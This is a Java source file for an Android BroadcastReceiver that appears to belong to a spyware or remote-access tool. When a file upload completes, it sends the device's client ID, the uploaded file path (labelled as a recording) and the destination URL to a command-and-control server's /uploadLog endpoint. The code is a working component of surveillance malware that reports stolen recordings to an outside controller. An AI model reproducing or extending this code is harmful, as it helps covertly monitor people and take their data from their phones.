package com.ot.grhq.client.receivers;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

import com.ot.grhq.client.functionality.Utils;

import org.json.JSONException;
import org.json.JSONObject;

/**
 * Completed file upload receiver
 */
public class UploadComplete extends BroadcastReceiver {

    @Override
    public void onReceive(Context context, Intent intent) {
        if ("upload_complete".equals(intent.getAction())) {
            String filePath = intent.getStringExtra("file_path");
            String uploadURL = intent.getStringExtra("upload_url");

            String message = Utils.clientID(context) + ": " + filePath + " successfully uploaded to " + uploadURL;

            String formData = "id=" + Utils.clientID(context);
            formData += "&type=client";
            formData += "&res=recording";
            formData += "&message=" + message;
            formData += "&timestamp=" + System.currentTimeMillis();

            new NotifyC2(Utils.getC2Address() + "/uploadLog", formData, result -> {

            }).execute();
        }
    }
}

